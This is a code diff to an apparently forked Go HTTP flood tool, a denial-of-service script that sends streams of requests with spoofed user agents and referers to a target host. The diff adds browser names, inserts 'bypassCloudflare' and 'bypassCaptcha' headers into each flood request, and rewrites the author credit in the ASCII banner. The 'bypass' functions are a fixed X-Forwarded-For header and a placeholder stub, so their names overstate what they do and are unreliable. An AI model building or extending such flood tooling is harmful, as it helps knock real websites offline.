@@ -53,7 +53,7 @@ var (
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
 	choice4 = []string{"Linux i686", "Linux x86_64"}
-	choice5 = []string{"chrome", "spider", "ie"}
+	choice5 = []string{"chrome", "spider", "ie", "firefox", "safari", "edge"}
 	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
 	spider  = []string{
 		"AdsBot-Google ( http://www.google.com/adsbot.html)",
@@ -128,6 +128,15 @@ func contain(char string, x string) int { //simple compare
 	return ans
 }
 
+func bypassCloudflare() string {
+	return "X-Forwarded-For: 1.1.1.1\r\n"
+}
+
+func bypassCaptcha() string {
+	// Replace with actual captcha bypass logic
+	return "captcha-bypass-header: value\r\n"
+}
+
 func flood() {
 	addr := host + ":" + port
 	header := ""
@@ -139,6 +148,8 @@ func flood() {
 			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
 			header += referers[rand.Intn(len(referers))] + "\r\n"
+			header += bypassCloudflare()
+			header += bypassCaptcha()
 		} else {
 			func() {
 				fi, err := os.Open(os.Args[5])
@@ -222,7 +233,7 @@ func main() {
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
 	fmt.Println("                         .||                     Golang version 2.0      ")
-	fmt.Println("                                                        C0d3d By L330n123")
+	fmt.Println("                                                        C0DED BY RexxUs")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use header.txt as data")
